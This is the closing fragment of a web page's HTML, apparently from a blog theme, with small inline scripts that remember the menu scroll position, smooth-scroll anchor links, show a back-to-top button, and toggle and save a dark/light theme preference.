</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>